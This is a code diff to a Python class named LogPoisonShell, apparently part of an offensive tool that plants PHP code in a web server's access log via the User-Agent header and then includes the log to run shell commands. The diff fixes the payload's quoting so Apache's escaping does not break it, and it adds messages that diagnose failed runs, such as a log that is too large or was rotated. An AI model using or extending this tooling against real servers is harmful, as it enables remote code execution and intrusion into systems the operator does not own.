@@ -150,17 +150,48 @@ class LogPoisonShell:
         head = body.rfind(start)
         tail = body.rfind(end)
         if head == -1 or tail <= head:
-            return (
-                "the injected command did not run: the marker never came back. "
-                "The log may not be includable, or it may be truncated before "
-                "reaching the line this request wrote"
-            )
+            return self._why_no_marker(body, start)
         return body[head + len(start):tail].strip() or "the command printed nothing"
 
+    @staticmethod
+    def _why_no_marker(body: str, marker: str) -> str:
+        """Say which of the two ways this failed, because they need different fixes.
+
+        The whole log is included, so its size is the payload's enemy: an
+        application that stops reading the file partway through - output
+        buffering, a size cap, a slow client - never reaches the line this request
+        appended, and the marker is absent for a reason that has nothing to do
+        with the log being includable. Reporting both as "the code did not run"
+        sends someone to check permissions when the answer is that the file is too
+        big to read to the end.
+        """
+        if len(body) < 4096:
+            return (
+                "the injected command did not run: the marker never came back and the response "
+                "is far smaller than the file, so the log itself may not be includable, or it "
+                "may have been rotated between the request that wrote it and the one that read it"
+            )
+        return (
+            "the injected command did not run: the response carries the log but stops before the "
+            "end of it, so the line this request appended was never reached. A large log will do "
+            "this on its own - the payload has to be near the end of what the application reads, "
+            "which means a small file, or one that was emptied first. The marker was: "
+            + marker
+        )
+
     def _plant(self) -> None:
-        """Leave PHP source in the log, in the one place a server records verbatim."""
+        """Leave PHP source in the log, in the one place a server records verbatim.
+
+        Single quotes around the array key, and that is not style. Apache escapes
+        the quotes in a request line as it writes them, so a payload written with
+        double quotes lands in the log as `$_GET[\\"c\\"]` - and including that
+        file is a parse error, not a command. The whole chain fails with the
+        server reporting a syntax error it found in its own access log, which is
+        a confusing thing to be told. Single quotes need no escaping in a log
+        line, and PHP reads the key the same either way.
+        """
         request = self.ctx.config["request"].clone()
-        request.headers.set("User-Agent", f'<?php system($_GET["{self.aux}"]); ?>')
+        request.headers.set("User-Agent", f"<?php system($_GET['{self.aux}']); ?>")
         self.ctx.send(request, action=f"{self.action}.plant")
         self._planted = True
 
